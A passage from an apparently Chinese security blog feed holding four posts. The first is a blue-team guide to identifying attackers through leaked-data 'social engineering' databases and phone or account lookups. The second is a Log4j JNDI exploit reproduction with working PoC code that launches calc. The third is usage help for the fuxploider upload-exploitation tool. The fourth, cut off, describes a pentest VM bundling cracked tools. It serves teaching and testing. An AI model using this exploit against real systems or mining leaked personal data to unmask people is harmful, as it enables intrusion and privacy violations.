ID跟踪、得到常用id信息收集</h3><p>在通过IP定位后技术追踪攻击者，可通过指纹库、社工库等或其他技术手段抓取到攻击者的微博账号、百度ID等信息，一般通过以下技术手段实现：</p><p>进行QQ等同名方式去搜索、进行论坛等同名方式搜索、社工库匹配等。</p><p>如ID是邮箱，则通过社工库匹配密码、以往注册信息等。</p><p>如ID是手机号，则通过手机号搜索相关注册信息，以及手机号使用者姓名等。</p><p>其他方法：</p><p>(1) 百度信息收集：“id” （双引号为英文）</p><p>(2) 谷歌信息收集</p><p>(3) src信息收集（各大src排行榜）</p><p>(4) 微博搜索（如果发现有微博记录，可使用tg查询weibo泄露数据）</p><p>(5) 微信ID收集：微信进行ID搜索（直接发钉钉群一起查）</p><p><strong>(6) 如果获得手机号（可直接搜索支付宝、社交账户等）</strong></p><p><strong>注意：获取手机号如果自己查到的信息不多，直接上报钉钉群（利用共享渠道对其进行二次社工）</strong></p><ul><li>豆瓣/贴吧/知乎/脉脉 你能知道的所有社交平台，进行信息收集</li></ul><p><img src="https://s1.ax1x.com/2022/12/04/zsftfI.md.png" alt="image"></p><p>例如，当通过ID追踪技术手段定位到某攻击者的QQ号、QQ网名等信息，通过专业社工库可以进一步追踪攻击者使用的QQ号注册过的其它网络ID，从而获取更多攻击者信息，从而确定攻击者的身份。</p><p>注意：手机号、昵称ID均为重点数据，如查不到太多信息，直接上报指挥部。</p><h3 id="4-预警设备信息取证"><a href="#4-预警设备信息取证" class="headerlink" title="4.预警设备信息取证"></a>4.预警设备信息取证</h3><p>上方数据一无所获，可考虑对其发起攻击的行为进行筛查，尝试判断其是否有指纹特征。</p><p>攻击者如果在攻击过程中对攻击目标上传攻击程序（如钓鱼软件），可通过对攻击者上传的恶意程序进行分析，并结合IP定位、ID追踪等技术手段对攻击进行分析溯源，常用的恶意程序分析网站有：</p><p>Ø 微步在线云沙箱：<a href="https://s.threatbook.cn/">https://s.threatbook.cn/</a></p><p>Ø Virustotal：<a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p><p>Ø 火眼（<a href="https://fireeye.ijinshan.com)/">https://fireeye.ijinshan.com）</a></p><p>Ø Anubis（<a href="http://anubis.iseclab.org)/">http://anubis.iseclab.org）</a></p><p>Ø joe（<a href="http://www.joesecurity.org)/">http://www.joesecurity.org）</a></p><h3 id="5-跳板机信息收集-触发"><a href="#5-跳板机信息收集-触发" class="headerlink" title="5.跳板机信息收集(触发)"></a>5.跳板机信息收集(触发)</h3><p>进入红队跳板机查询相关信息，如果主机桌面没有敏感信息，可针对下列文件进行收集信息。</p><p>Last: 查看登录成功日志</p><p><img src="https://s1.ax1x.com/2022/12/04/zsfUpt.md.png" alt="image"></p><p>Cat ~/.bash_history   查看操作指令</p><p><img src="https://s1.ax1x.com/2022/12/04/zsfBnS.png" alt="image"></p><p>Ps -aux  查看进程</p><p><img src="https://s1.ax1x.com/2022/12/04/zsfchn.png" alt="image"></p><p>Cat /etc/passwd</p><p>查看是否有类似ID的用户</p><p>重点关注uid为500以上的登录用户</p><p>nologin为不可登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">作者：Kali9517</span><br><span class="line">原文地址：https://www.freebuf.com/fevents/334657.html</span><br></pre></td></tr></table></figure><p><strong>注：如有侵权请联系删除</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;背景：&quot;&gt;&lt;a href=&quot;#背景：&quot; class=&quot;headerlink&quot; title=&quot;背景：&quot;&gt;&lt;/a&gt;&lt;strong&gt;背景：&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;授权授权攻防演练过程中，攻击者千方百计使用各种方法渗透目标。一般情况下攻击链包括：侦察、武器化、交</summary>
      
    
    
    
    <category term="蓝队" scheme="http://example.com/categories/%E8%93%9D%E9%98%9F/"/>
    
    
    <category term="溯源" scheme="http://example.com/tags/%E6%BA%AF%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>log4j原理分析</title>
    <link href="http://example.com/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/07/20/log4j%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</id>
    <published>2022-07-20T09:27:04.000Z</published>
    <updated>2022-12-06T06:25:45.757Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>十几天前，log4j被爆出“史诗级”漏洞。其危害非常大，影响非常广。该漏洞非常容易利用，可以执行任意代码。这个漏洞的影响可谓是重量级的。</p><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>由于Apache Log4j存在递归解析功能，未取得身份认证的用户，可以从远程发送数据请求输入数据日志，轻松触发漏洞，最终在目标上执行任意代码。简单点说，就是可以通过输入一些具有特殊意义的字符来攻击服务器。</p><p>如果入侵者在前端页面上输入了：${jndi:rmi://127.0.0.1:8080/evil} 这串字符， 然后后台用log4j记录了这串字符， log4j会自动使用jndi调用这个地址上的rmi内容。如果这个rmi的内容是删除数据库，重启服务器这种恶意程序，被攻击之后还是趁早跑路吧。（开个玩笑）</p><h3 id="关于JNDI："><a href="#关于JNDI：" class="headerlink" title="关于JNDI："></a>关于JNDI：</h3><p>JNDI(Java Naming and Directory Interface)是Java提供的Java 命名和目录接口。通过调用JNDI的API应用程序可以定位资源和其他程序对象。JNDI是Java EE的重要部分，需要注意的是它并不只是包含了DataSource(JDBC 数据源)，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA，摘自百度百科。</p><h3 id="关于RMI："><a href="#关于RMI：" class="headerlink" title="关于RMI："></a>关于RMI：</h3><p>RMI（remote method invocation）即远程方法调用，是允许运行在一个java虚拟机上的对象调用运行在另外一个java虚拟机上的对象的方法，JAVA RMI实现JAVA程序之间跨越JVM的远程通信。通过RMI可以让调用远程JVM上对象方法，仿佛调用本地JVM上对象方法一样简单、快捷。</p><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>首先，可以先创建一个普通的maven项目， 在pom中引入log4j2.14.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>再创建一个用于开启RMI服务端的java文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, AlreadyBoundException &#123;</span><br><span class="line">        LocateRegistry.createRegistry(8080);</span><br><span class="line">        final Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 8080);</span><br><span class="line">        Reference ref = new Reference(&quot;EvilCode&quot;, &quot;EvilCode&quot;, null);</span><br><span class="line">        final ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(&quot;evil&quot;, referenceWrapper);</span><br><span class="line">        System.out.println(&quot;启动成功&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再创建EvilCode恶意程序攻击类， 这里由于是自己的电脑， 还是用经典的calc计算器举粟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class EvilCode &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        System.err.println(&quot;打开计算器&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后创建一个启动类， 用于模拟我们的服务器程序， 使用log4j打印日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    static Logger logger = LogManager.getLogger();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //用input局部变量来模拟入侵者输入的内容</span><br><span class="line">        String input = &quot;$&#123;jndi:rmi://127.0.0.1:8080/evil&#125;&quot;;</span><br><span class="line">        //这里直接用log4j输入</span><br><span class="line">        logger.error(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先启动RMIServer， 再启动Main， 可以看到， 计算器被弹出了：</p><p><img src="https://s1.ax1x.com/2022/12/06/z6sYEn.png" alt="image"></p><p>可以升级log4j最新版本或者更新jdk较高版本来解决这个问题</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;十几天前，log4j被爆出“史诗级”漏洞。其危害非常大，影响非常广。该漏洞非常容易利用，可以执行任意代码。这个漏洞的影响可谓是重量级</summary>
      
    
    
    
    <category term="漏洞" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="log4j" scheme="http://example.com/tags/log4j/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞扫描器和利用工具</title>
    <link href="http://example.com/2022/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    <id>http://example.com/2022/05/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/</id>
    <published>2022-05-04T05:51:14.000Z</published>
    <updated>2022-05-04T06:17:32.000Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>*0x01 fuxploider介绍*</strong></em></p><p>Fuxploider是一种开源渗透测试工具，可自动检测和利用文件上传表单缺陷的过程。该工具能够检测允许上传的文件类型，并能够检测哪种技术最适合在所需的Web服务器上上传<code>Web Shell</code>或任何恶意文件。</p><p><em><strong>*0x02 fuxploider安装*</strong></em></p><p>Python3.6+</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/almandin/fuxploider.git</span><br><span class="line">cd fuxploider</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><p>如果您的pip有问题(并且您使用Windows)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -r requirements.txt                       </span><br></pre></td></tr></table></figure><p>对于Docker安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t almandin/fuxploider .                   </span><br></pre></td></tr></table></figure><p><em><strong>*0x03 fuxploider使用*</strong></em></p><p>要获取基本选项和开关的列表，请使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fuxploider.py -h              </span><br></pre></td></tr></table></figure><p>帮助：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Usage: fuxploider.py [-h] [-d postData] [--proxy proxyUrl] [--proxy-creds [credentials]] [-f integer] [--cookies omnomnom] [--uploads-path path] [-t templateName] [-r regex] -u target [--not-regex regex] [--true-regex regex] [-l listOfExtensions | -n n] [-v | -vv | -vvv] [-s] [-y] [-T Threads] [-U useragent | --random-user-agent] [-m] [--input-name image] [--form-action upload.php]</span><br><span class="line"></span><br><span class="line">可选参数:</span><br><span class="line">  -h, --help                                                  显示这个帮助信息并退出</span><br><span class="line">  -d postData, --data postData                                通过 POST 方法传输的额外数据 Example: -d &quot;key1=value1&amp;key2=value2&quot;</span><br><span class="line">  --proxy proxyUrl                                            代理信息 Example: --proxy &quot;user:password@proxy.host:8080&quot;</span><br><span class="line">  --proxy-creds [credentials]                                 在运行时提示代理凭据 Format: &#x27;user:pass&#x27;</span><br><span class="line">  -f integer, --filesize integer                              用于创建和上传文件的文件大小 (in kB).</span><br><span class="line">  --cookies omnomnom                                          用于 HTTP 请求的 Cookie Example: PHPSESSID=aef45aef45afeaef45aef45&amp;JSESSID=AQSEJHQSQSG</span><br><span class="line">  --uploads-path path                                         远程服务器上放置上传文件的路径 Example: &#x27;/tmp/uploads/&#x27;</span><br><span class="line">  -t templateName, --template templateName                    用于代码执行检测的恶意有效载荷 默认是使用所有已知的模板 有关模板的完整列表参见 TEMPLATE 部分</span><br><span class="line">  -r regex, --regex-override regex                            指定用于检测代码执行的正则表达式 覆盖在使用的模板中定义的默认代码执行检测正则表达式</span><br><span class="line">  -l listOfExtensions, --legit-extensions listOfExtensions    以逗号分隔的合法的扩展名列表 用于表单的正常使用 Example: &#x27;jpg,png,bmp&#x27;</span><br><span class="line">  -n n                                                使用的常用扩展名的数量 Example: -n 100</span><br><span class="line">  -v                                                          详细模式</span><br><span class="line">  -vv                                                         非常详细的模式</span><br><span class="line">  -vvv                                                        非常非常详细的模式</span><br><span class="line">  -s, --skip-recon                                            跳过侦查阶段 在这一阶段 Fuxploider 试图确定服务器期望和过滤哪些扩展名 需要 -l 开关</span><br><span class="line">  -y                                           蛮力检测每个入口点 不会在第一次发现代码执行时停止</span><br><span class="line">  -T Threads, --threads Threads                               并行任务线程的数量</span><br><span class="line">  -U useragent, --user-agent useragent                        在请求目标时使用的用户代理</span><br><span class="line">  --random-user-agent                                         在请求目标时使用随机的用户代理</span><br><span class="line"></span><br><span class="line">必要具名参数:</span><br><span class="line">  -u target, --url target                                     包含要测试的文件上传表单的 Web 页面 URL Example: http://test.com/index.html?action=upload</span><br><span class="line">  --not-regex regex                                           匹配上传失败的正则表达式</span><br><span class="line">  --true-regex regex                                          匹配上传成功的正则表达式</span><br><span class="line"></span><br><span class="line">手动表单检测参数:</span><br><span class="line">  -m, --manual-form-detection                                 禁用自动表单检测 当使用 JavaScript 加载表单和当 URL 中存在多个文件上传表单而导致自动检测失败时很有用</span><br><span class="line">  --input-name image                                          输入文件的名称 Example: &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt;</span><br><span class="line">  --form-action upload.php                                    表单 action 属性的路径 Example: &lt;form method=&quot;POST&quot; action=&quot;upload.php&quot;&gt;</span><br><span class="line"></span><br><span class="line">[TEMPLATES]</span><br><span class="line">模板是被扫描的远程服务器上的恶意负载</span><br><span class="line">代码执行检测是基于负载的预期输出完成的</span><br><span class="line">  默认模板如下: </span><br><span class="line">    &#x27;phpinfo&#x27; - &#x27;简单调用 phpinfo() 函数的 php 纯文本文件&#x27;</span><br><span class="line">    &#x27;nastygif&#x27; - &#x27;有效的 GIF 文件 在文件的注释部分调用 phpinfo() 函数&#x27;</span><br><span class="line">    &#x27;nastyjpg&#x27; - &#x27;有效的 JPG 文件 在文件的注释部分调用 phpinfo() 函数&#x27;</span><br><span class="line">    &#x27;basicjsp&#x27; - &#x27;基础的 JSP 文件 具有简单的数学表达式&#x27;</span><br><span class="line">    &#x27;imagetragick&#x27; - &#x27;尝试利用 ImageMagick CVE-2016–3714 RCE 漏洞&#x27;</span><br><span class="line">    &#x27;htaccess&#x27; - &#x27;利用 Apache 2.4 错误配置上传 .htaccess 文件&#x27;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;*0x01 fuxploider介绍*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Fuxploider是一种开源渗透测试工具，可自动检测和利用文件上传表单缺陷的过程。该工具能够检测允许上传的文件类型，并能够检测哪种技术最适合在所需的Web服务器上上传</summary>
      
    
    
    
    <category term="工具" scheme="http://example.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>windows&amp;kali集成版</title>
    <link href="http://example.com/2022/04/20/windows-kali%E9%9B%86%E6%88%90%E7%89%88/"/>
    <id>http://example.com/2022/04/20/windows-kali%E9%9B%86%E6%88%90%E7%89%88/</id>
    <published>2022-04-20T01:20:52.000Z</published>
    <updated>2022-04-20T01:26:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>​                                     @真琴师傅基于Windows打造的一个渗透测试套件工具包。</p><p>github项目地址</p><p><a href="https://github.com/makoto56/penetration-suite-toolkit">https://github.com/makoto56/penetration-suite-toolkit</a></p><p><code>本项目制作的初衷是帮助渗透新手快速搭建工作环境，工欲善其事，必先利其器。    </code>其中包括的有：系统环境、渗透、逆向、CTF及其他常用工具等，更多详情可进项目中查看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">系统简介</span><br><span class="line">- 基于Win10 Workstation 21H2 x64 MSDN原版镜像制作；</span><br><span class="line">- 完整安装WSL Kali Linux 2022.1，并配置图形化模式；</span><br><span class="line">- 精简系统自带软件，美化字体及部分图标，适度优化；</span><br><span class="line">- 镜像容量74.5G，使用单磁盘文件存储，提升性能；</span><br><span class="line">- 建议运行环境：</span><br><span class="line">  * vmware：16.0</span><br><span class="line">  * 运行内存：8G</span><br><span class="line">  * 固态硬盘：100G</span><br><span class="line">制作声明：</span><br><span class="line">1. 所有的安装类软件均下载自软件对应的官方网站；</span><br><span class="line">2. 所有的绿色类软件均下载自果核剥壳。（https://www.ghxi.com/）；</span><br><span class="line">3. 所有的脚本类工具均下载自github。（https://github.com/）；</span><br><span class="line">4. 部分授权类工具（破解版）及优秀的渗透工具来自微信公众号分享；</span><br><span class="line"></span><br><span class="line">   * 排名不分先后，同时也推荐大家关注，一起变得更强。</span><br><span class="line">   </span><br><span class="line">   雾晓安全、果核剥壳、归零安全、潇湘信安、学蚁致用、谢公子学安全、利刃藏锋、棉花糖网络安全圈、HACK技术沉淀营、无尾熊安全、T00ls、</span><br><span class="line">   渗透攻击红队、洛米唯熊、雷石安全实验室、酒仙桥六号部队、InBug实验室、鸿鹄实验室、黑白之道、HACK之道、GobySec、Gcow安全团队、</span><br><span class="line">   Gamma实验室、CobaltStrike实战、冰河技术、网络安全与黑客技术、QZ的安全悟道、菜鸟学信安、乌雲安全、白帽子飙车路、信安之路、chaosec、</span><br><span class="line">   鸟哥谈安全、安全小飞侠、moonsec、系统安全运维、天驿安全、零组攻防实验室、lemonsec、橘猫学安全、Hacking黑白红、渗透xiao白帽、</span><br><span class="line">   渗透安全团队、白帽子社区、HACK学习呀、猪猪谈安全、开普勒安全团队、吾爱破解论坛、WhITECat安全团队、寻云安全团队、Khan安全攻防实验室、</span><br><span class="line">   Bypass、天億网络安全、关注安全技术、玄魂工作室、边界骇客、零度安全攻防实验室、WgpSec狼组安全团队、黑白天实验室、靶机狂魔、渗透云笔记、</span><br><span class="line">   TeamsSix、hijackY、TimeLine Sec、重生信息安全、GobySec、Gcow安全团队、冰蚕实验室。</span><br><span class="line"> </span><br><span class="line">5. 本项目制作的初衷是帮助渗透新手快速搭建工作环境，工欲善其事，必先利其器；</span><br><span class="line">6. 本项目由于后期调试原因可能会遗留部分本人的信息，请直接忽视；</span><br><span class="line">7. 本项目坚决不接受也从未曾接受任何形式的赞助；</span><br><span class="line">8. 如果您有好的意见或者建议，请联系邮箱burpsuite@qq.com。</span><br><span class="line">免责声明：</span><br><span class="line">1. 本镜像仅面向合法授权的企业安全建设行为，如您需要测试本镜像的可用性，请自行搭建靶机环境；</span><br><span class="line">2. 在使用本镜像进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权；</span><br><span class="line">3. 如您在使用本镜像的过程中存在任何非法行为，您需自行承担相应后果，作者将不承担任何法律及连带责任。</span><br></pre></td></tr></table></figure><h2 id="软件及工具介绍："><a href="#软件及工具介绍：" class="headerlink" title="软件及工具介绍："></a><code>软件及工具介绍：</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span 